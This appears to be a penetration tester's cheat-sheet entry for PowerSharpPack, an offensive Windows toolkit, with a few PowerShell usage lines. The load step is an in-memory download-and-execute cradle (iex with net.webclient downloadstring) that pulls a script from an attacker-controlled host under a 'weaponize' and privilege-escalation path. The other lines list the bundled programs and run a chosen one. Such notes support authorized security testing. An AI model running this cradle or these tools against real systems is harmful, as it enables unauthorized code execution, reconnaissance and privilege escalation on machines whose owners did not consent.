# powersharppack
#plateform/windows #target/local #cat/RECON #tag/powershell

## load 
```powershell
iex(new-object net.webclient).downloadstring('http://<local_ip>:<port|80>/windows/windows_weaponize/ps/empire/privesc/PowerSharpPack.ps1')
```

## list all programs
```powershell
PowerSharpPack 
```

## run specific programm
```powershell
PowerSharpPack -<name> -Command "<params>"
```